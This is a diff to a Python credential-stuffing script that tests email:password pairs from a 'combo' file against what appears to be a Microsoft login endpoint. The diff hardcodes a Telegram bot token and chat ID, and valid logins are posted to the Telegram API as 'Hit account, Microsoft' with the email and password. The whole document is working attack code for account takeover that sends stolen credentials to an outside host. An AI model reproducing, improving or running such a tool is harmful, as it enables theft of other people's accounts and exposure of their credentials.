@@ -1,7 +1,7 @@
 import requests
 combo_name = input("Input Combo file : ")
-iD = input('EnTeR iD : ')
-ToK = input('EnTeR ToKeN : ')
+iD = '6781247348'
+ToK = '7061836059:AAEkaAvRSiXQE4sBMb9FBxUwmQjh9EQQPEw'
 with open(combo_name, 'r') as f:
     accounts = f.readlines()
 for account in accounts:
@@ -45,15 +45,16 @@ for account in accounts:
 
     response = requests.post(url, headers=headers, data=data)
     if 'Type = {SQSA: 6, CSS: 5,' in response.text:
-    	print('bad login : [ '+email+':'+password+' ]')
-    	pass
+      print('bad login : [ '+email+':'+password+' ]')
+      pass
     elif 'name="ipt" id="ipt"' in response.text:
-    	print('secure login : [ '+email+':'+password+' ]')
+      print('secure login : [ '+email+':'+password+' ]')
     else:
-    	print( 'صحيح : [ '+email+':'+password+' ]')
-        text=f'''
-        New Account
-        account > {pass}'''
-requests.post(f'https://api.telegram.org/bot{ToK}/sendMessage?chat_id={iD}&text={text}')
-    	
-    	
+      print('Done : [ '+email+':'+password+' ]')
+text = f"""
+Hit account , Microsoft
+mail : [ {email} ]
+pass : [ {password} ]
+me? : @kckkkkc !"""
+
+requests.post(f"https://api.telegram.org/bot{ToK}/sendvideo?chat_id={iD}&video=https://t.me/ppy9y/4&caption="+str(text))
